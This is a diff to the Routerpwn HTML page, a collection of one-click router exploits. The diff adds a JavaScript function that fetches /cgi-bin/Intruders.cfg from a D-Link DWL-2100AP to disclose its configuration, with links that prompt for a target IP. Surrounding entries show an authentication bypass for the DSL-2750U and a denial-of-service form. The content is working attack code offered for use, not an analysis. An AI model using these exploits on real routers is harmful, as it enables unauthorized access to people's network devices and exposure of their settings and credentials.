@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.191</title>
+		<title>Routerpwn 1.13.192</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -206,6 +206,13 @@ function hg866dosr() {
 	if (ip==null || ip==""){}else{
 		document.hg866dos.submit();
 	}
+}
+
+// D-Link DWL-2100AP - Configuration Disclosure
+function dwl2100ap_configdisclosure(ip)
+{
+    ip = ip || "dlink-dwl-2100ap";
+    document.location="http://"+ip+"/cgi-bin/Intruders.cfg";
 }
 
 // D-Link DSL-2750U - Bypass Auth
@@ -2364,10 +2371,16 @@ a=a+1
 <br><br>
 <section id="DLink">
 <h2>D-Link</h2>
-<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325, <a href="javascript:img('DSL-2750U')">DSL-2750U</a></h3>
+<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325, <a href="javascript:img('DSL-2750U')">DSL-2750U, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a></h3>
 
 <article>
+	<div>15/01/14</div>
+	<div><a href="http://1337day.com/exploit/8713">[+]</a></div>
+	<div><a href="javascript:dwl2100ap_configdisclosure()">DWL-2100AP - Configuration Disclosure</a></div>
+	<div><a href="javascript:dwl2100ap_configdisclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
+<article>
 	<div>15/01/14</div>
 	<div><a href="http://1337day.com/exploit/21725">[+]</a></div>
 	<div><a href="javascript:dsl2750u_bypassauth()">DSL-2750U - Authentication Bypass</a></div>
